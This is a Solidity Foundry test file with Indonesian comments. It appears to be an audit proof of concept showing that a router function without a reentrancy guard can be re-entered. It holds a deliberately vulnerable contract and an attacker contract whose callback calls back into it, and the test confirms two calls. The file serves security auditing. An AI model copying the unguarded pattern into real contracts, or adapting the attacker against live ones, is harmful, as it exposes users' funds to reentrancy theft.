// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

interface ICallback {
    function callback() external;
}

contract VulnerableRouter {
    uint256 public callCount;

    // Fungsi tanpa nonReentrant – memanggil callback pada setiap target
    function batchProcess(address[] calldata targets) external {
        callCount++;
        for (uint256 i = 0; i < targets.length; i++) {
            ICallback(targets[i]).callback();
        }
    }
}

contract Attacker is ICallback {
    VulnerableRouter router;
    uint256 public attackCount;

    constructor(address _router) {
        router = VulnerableRouter(_router);
    }

    function attack() external {
        address[] memory targets = new address[](1);
        targets[0] = address(this);
        router.batchProcess(targets);
    }

    // Callback dipanggil oleh router, di sini kita masuk kembali
    function callback() external override {
        if (attackCount == 0) {
            attackCount++;
            // Reentrancy: panggil batchProcess lagi
            address[] memory empty;
            router.batchProcess(empty);
        }
    }
}

contract ReentrancyPoC is Test {
    VulnerableRouter router;
    Attacker attacker;

    function setUp() public {
        router = new VulnerableRouter();
        attacker = new Attacker(address(router));
    }

    function test_ReentrancySucceeds() public {
        uint256 beforeCalls = router.callCount();
        attacker.attack();
        uint256 afterCalls = router.callCount();

        console2.log("batchProcess calls:", afterCalls);
        assertEq(afterCalls, 2, "Reentrancy harus menyebabkan 2 panggilan");

        console2.log("");
        console2.log("TERBUKTI: batchCrossChainClaimPayout tanpa nonReentrant rentan reentrancy.");
    }
}
